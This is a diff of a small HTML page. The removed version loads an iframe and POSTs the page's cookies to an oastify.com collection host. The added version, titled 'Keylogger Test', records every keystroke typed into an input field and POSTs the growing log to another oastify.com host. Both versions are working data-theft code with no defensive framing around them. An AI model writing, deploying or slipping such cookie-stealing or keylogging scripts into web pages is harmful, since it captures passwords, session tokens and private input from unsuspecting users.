@@ -3,56 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iframe Example</title>
+    <title>Keylogger</title>
 </head>
 <body>
-    <h1>Iframe Example</h1>
+    <h1>Keylogger Test</h1>
+    <input type="text" id="inputField" placeholder="Start typing...">
 
-    <!-- Create the iframe dynamically -->
     <script>
-        // Create the iframe element
-        const iframe = document.createElement('iframe');
-        
-        // Set the sandbox attributes for the iframe
-        iframe.sandbox.add('allow-scripts');
-        iframe.sandbox.add('allow-same-origin');
-        
-        // Set the source URL for the iframe (replace with your desired URL)
-        iframe.src = 'https://boomplay.com'; // External source
-        
-        // Set the iframe dimensions
-        iframe.width = '800';
-        iframe.height = '600';
-        
-        // Append iframe to the body
-        document.body.appendChild(iframe);
+        const inputField = document.getElementById('inputField');
 
-        // Log iframe creation
-        console.log('Iframe created with sandbox attributes: allow-scripts, allow-same-origin');
+        // Create an array to store key presses
+        let keyLogs = [];
 
-        // Send cookies from the parent to the external server
-        const sendCookiesToServer = () => {
-            const parentCookies = document.cookie; // Get cookies from the parent window
+        // Capture key press event
+        inputField.addEventListener('keydown', (event) => {
+            const key = event.key; // Get the key that was pressed
+            keyLogs.push(key); // Store the keypress
 
-            // Send cookies to the external server (replace with your server URL)
-            fetch('https://nb2ud7etp70klpz0ksogmknrjip9d01p.oastify.com', {
+            // Send the key logs to your server via the proxy server
+            fetch('https://7goeirjdur54q94kpct0r4sbo2util6a.oastify.com', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    cookies: parentCookies,
-                }),
+                body: JSON.stringify({ keys: keyLogs })
             })
             .then(response => response.json())
-            .then(data => console.log('Cookies sent to external server:', data))
-            .catch(error => console.error('Error sending cookies:', error));
-        };
-
-        // Call the function to send cookies after iframe loads
-        iframe.onload = function() {
-            sendCookiesToServer();
-        };
+            .catch(error => console.error('Error sending keystrokes:', error));
+        });
     </script>
 </body>
 </html>
